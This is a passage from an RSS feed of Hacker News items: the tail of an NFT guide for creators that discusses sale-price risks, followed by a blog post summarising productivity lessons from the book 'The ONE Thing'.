want to create, buy, or sell NFTs, be aware of these risks:</p><ol><li><p><strong>Have the right expectations</strong>: If you don’t have a large following already, chances are you won’t be able to sell your NFT for tens of thousands of dollars. The average sale price of an NFT in January 2021 was <a href="https://nonfungible.com/market/history">$864</a>.</p></li><li><p><strong>There’s a lot of speculation in the market</strong>. In December 2020, the average sale price of an NFT was <a href="https://news.bitcoin.com/8-2-million-worth-of-nft-based-artwork-sold-in-the-last-month-of-2020-as-eth-prices-rally/">$126</a>, which shows how fast this market is growing. NFT sales are also affected by price changes in ether. Be careful buying expensive NFTs that might not hold value over time. </p></li></ol><p>NFTs are an exciting new way for creators to make money. The let fans own a creator’s content and directly invest in a creator's success. </p><blockquote><div><p><strong>The bottom line is: In the creator economy, most of the value should go to the creator and the fans, not the platforms. </strong></p><p><strong>NFTs and crypto will make this a reality.</strong></p></div></blockquote><p>Phil and I will be hosting an NFT 101 room on Clubhouse this Sunday night at 8 PM pst to discuss this article. <a href="https://www.joinclubhouse.com/event/Prao5pyG">Sign up now and tune in Sunday</a>!</p></div></div>]]>
            </description>
            <link>https://creatoreconomy.so/p/guide-to-nfts-for-creators</link>
            <guid isPermaLink="false">hacker-news-small-sites-26209575</guid>
            <pubDate>Sun, 21 Feb 2021 00:31:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I've Learned While Reading the One Thing Book]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26209473">thread link</a>) | @shankarro
<br/>
February 20, 2021 | https://benwajdi.com/2021/02/21/what-ive-learned-while-reading-the-one-thing-book-by-garry-w-keller-jay-papasan/ | <a href="https://web.archive.org/web/*/https://benwajdi.com/2021/02/21/what-ive-learned-while-reading-the-one-thing-book-by-garry-w-keller-jay-papasan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="bsf_rt_marker"><div kcite-section-id="691">
<div><!-- Superb Social Share and Follow Buttons --><p>Follow us on Social Media</p></div>
<hr>



<p>The biggest challenge we face during our lifetimes, more than any other generation across history,  is information overload. And if don’t take control of what’s coming at us, information and input coming from all the possible places (from TV to Netflix to Twitter to Instagram), it will take control of us. It will own us and it will run our lives and make us feel miserable.</p>



<p><a href="http://benwajdi.com/go/one-thing-book/" target="_blank" rel="noreferrer noopener">This is a book</a> that had been recommended to me by a fellow writer and blogger. The ONE thing focuses on the finding that one and only thing that matters the most in your journey towards your goals, and what you need to do to make reserved or “blocked” time for that thing and protect that block with all you got.</p>



<p>Here are the top X things and principles I learned while reading<a href="http://benwajdi.com/go/one-thing-book/" target="_blank" rel="noreferrer noopener"> the book</a>:</p>




<h2><span id="Go_as_Small_as_Possible"></span>Go as Small as Possible:<span></span></h2>



<p>No matter how big your goal or how <a href="http://benwajdi.com/go/success-consciousness/" target="_blank" rel="noreferrer noopener">success conscious</a> are you, or where you want to be, you will have to start small (and often very small) if you really want to get there.</p>



<p>Many people think that going for a big target also means or implies starting to shoot for the moon fresh from the start. That is false, and can only get you to give up so soon. Reduce it to its childish terms/components and it becomes simple, measurable, and attainable.</p>



<p>Your job is to find ONE thing and one only such that by doing it, everything else becomes easier, unnecessary, or obsolete.</p>



<p>Then, you commit to al least 4 hours each day to doing that One thing.</p>



<blockquote><p>Until my ONE thing is done—everything else is a distraction!</p><cite><a href="http://benwajdi.com/go/one-thing-book/" target="_blank" rel="noreferrer noopener">The ONE thing</a></cite></blockquote>



<center><a href="https://track.flexlinkspro.com/g.ashx?foid=2.2544507.12912443&amp;trid=1230907.175621&amp;foc=16&amp;fot=9999&amp;fos=5" rel="nofollow noopener" target="_blank" alt="300x250 - Blue Backpack Girl Ad" title="300x250 - Blue Backpack Girl Ad"><img src="https://www.lduhtrp.net/image-1760738-12912443-1535639060000"></a><img loading="lazy" src="https://track.flexlinkspro.com/i.ashx?foid=2.2544507.12912443&amp;trid=1230907.175621&amp;foc=16&amp;fot=9999&amp;fos=5" width="0" height="0"></center>



<h2><span id="The_Domino_Effect"></span>The Domino Effect:<span></span></h2>



<figure><img loading="lazy" width="1024" height="768" src="https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-1024x768.png" alt="" srcset="https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-1024x768.png 1024w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-300x225.png 300w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-768x576.png 768w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-1536x1152.png 1536w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-2048x1536.png 2048w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-1200x900.png 1200w, https://benwajdi.com/wp-content/uploads/2021/02/dominoeffect-1980x1485.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Domino Effect, “Leveraged Action that Will Start a Domino Run” </figcaption></figure>



<p>By starting to do our ONE thing, we begin to line up your dominoes. We line up enough of them over the years, and we enjoy the benefits of <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/The_Domino_Effect" target="_blank">The Domino Effect</a>.</p>



<p>At its core, it is a geometric progression. And it very much resembles a very long train: “it starts out too slow to notice, until it’s moving too fast to stop”.</p>



<p>=&gt; Success, by the domino logic, is built sequentially (one THING at a time)</p>



<h2><span id="Success_Leaves_Clues"></span>Success Leaves Clues:<span></span></h2>



<p>The misinformation, myths, and lies keeping us from embracing and accepting the fact we only need ONE THING. These are false claims thrown at us over and over again, start to become familiar and start to sound like they are true.</p>



<p>Beware of the six thrown lies that will be thrown at you time and time again. They will keep you poor, unfocused, and miserable.</p>



<p>Beware of the six thrown lies that will be thrown at you time and time again. They will keep you poor, unfocused, and miserable—here they are the six lies:</p>



<ul><li>Everything Matters Equally</li><li>Multitasking</li><li>A Disciplined Life</li><li>Willpower is always on Will-Call</li><li>A Balanced Life</li><li>Big Is Bad</li></ul>



<p>Don’t spread yourself too thin!</p>



<p>Someone may be telling you that everything matters equally, and that you never know what could turn out the thing that matters the most and that, that’s why, you should hedge your bets.</p>



<p>Well, if that’s the case and you still don’t know what your ONE thing is, then and as the author tells us, your ONE thing at the moment is to find that ONE thing.</p>



<p>Counter-attack tips from the author:</p>



<ul><li>Have Time Blocked each day for your ONE thing</li><li>Build a <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Bunker" target="_blank">Bunker</a></li><li>Never leave it (while working) except for the bathroom</li><li>Protect Your Time Blocks</li><li>Assign at least 4 hours each day to doing your ONE thing</li></ul>



<h2><span id="The_Three_Commitments"></span>The Three Commitments:<span></span></h2>



<figure><img loading="lazy" width="1024" height="768" src="https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-1024x768.png" alt="" srcset="https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-1024x768.png 1024w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-300x225.png 300w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-768x576.png 768w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-1536x1152.png 1536w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-2048x1536.png 2048w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-1200x900.png 1200w, https://benwajdi.com/wp-content/uploads/2021/02/thethreecommitments-1980x1485.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Three Commitments</figcaption></figure>



<blockquote><p>the journey of the successful lifelong learning is never over</p></blockquote>



<ol><li>Follow the Path of Mastery:<br>Try to perceive mastery as a path instead of a destination you’ll arrive at. Remember that ‘mastery’ is a way of thinking and a journey that has no end. It doesn’t matter what you are trying to master, whether it is <a rel="noreferrer noopener" href="http://benwajdi.com/go/master-the-guitar/" target="_blank">mastering the guitar</a>, or <a href="http://benwajdi.com/go/wallstreetwindow/" target="_blank" rel="noreferrer noopener">mastering the stock market</a>, or even <a rel="noreferrer noopener" href="http://benwajdi.com/go/learning-mastery-guide/" target="_blank">mastering mastery the science of learning</a> itself, IT WILL TAKE TIME, IT IS A JOURNEY.</li><li>Move from ‘E’ to ‘P’:<br>E stands for Entrepreneurial, and P stands for Purposeful. E is doing thing with energy, curiosity, excitement and enthusiasm.<p>‘E’ will lead you to Disappointment =&gt; Resignation =&gt; Greener Pastures =&gt; The Cycle Continues</p><p>P is doing whatever it takes to get to certain level or point.<br>And it will lead you to Focus =&gt; Models =&gt;Systems =&gt; Breakthroughs<br>Do not accept plateaus just because it is something you think it is beyond your natural ability. That creates an artificial limit on your future potential &amp; possibilities in life.</p></li><li>Live the Accountability Cycle:<br>The contrast here is: Accountable vs Victim<br>This is the most important of among the three commitments.<br>With this, you’ll absorb the ceilings you’ll encounter and you will keep going.</li></ol>



<p>=&gt; Don’t fight reality or ignore it. Work around it.</p>







<h2><span id="The_Four_Thieves"></span>The Four Thieves:<span></span></h2>



<figure><img loading="lazy" width="1024" height="768" src="https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-1024x768.png" alt="" srcset="https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-1024x768.png 1024w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-300x225.png 300w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-768x576.png 768w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-1536x1152.png 1536w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-2048x1536.png 2048w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-1200x900.png 1200w, https://benwajdi.com/wp-content/uploads/2021/02/thefourthieves-1980x1485.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Four Thieves. ‘It’s not a relief, it’s a thief!’</figcaption></figure>



<blockquote><p>Invitations and interruptions will come at you from everywhere imaginable.</p></blockquote>



<ul><li>Your Inability to day ‘NO’: This is why the author advises to build our own bunker, have blocked time, and protect it by never leaving the bunker or letting anyone or anything interrupt us while doing our ONE thing.</li><li>Fear of Chaos: Messes are inevitable on your way to success and big results.</li><li>Poor Health Habits: Your body is the vehicle that carries you through experiencing life. Don’t delude yourself by pretending you can go four days without sleep or one day on one meal and that you can get away with it. Your health is like a credit card: borrow now, pay later with interest. Take care of your health!</li><li>Environment Doesn’t Support Your Goals: This is the most challenging obstacle to overcome. I know really, because I come from such an environment. It works like a bucket of crabs, with you being the one crab that is about to escape, so everyone else down there starts to pull you back down.</li></ul>



<blockquote><p>Your environment is simply who you see and what you experience every day.</p></blockquote>






<!-- Mailchimp for WordPress v4.8.1 - https://wordpress.org/plugins/mailchimp-for-wp/ --><!-- / Mailchimp for WordPress Plugin -->


<p><strong>If you enjoyed reading this post, you can support my work by </strong><a href="https://www.buymeacoffee.com/benwajdi">buying me a book</a> (one time donation) or <a href="https://www.patreon.com/realbenwajdi" target="_blank" rel="noreferrer noopener">by becoming a patron</a>.</p>

<!-- Kudos 1.1.1-->


<!-- kcite active, but no citations found -->
</div> <!-- kcite-section 691 --></div></div>]]>
            </description>
            <link>https://benwajdi.com/2021/02/21/what-ive-learned-while-reading-the-one-thing-book-by-garry-w-keller-jay-papasan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26209473</guid>
            <pubDate>Sun, 21 Feb 2021 00:15:31 GMT</pubDate>
        </item>
    </channel>
</rss>
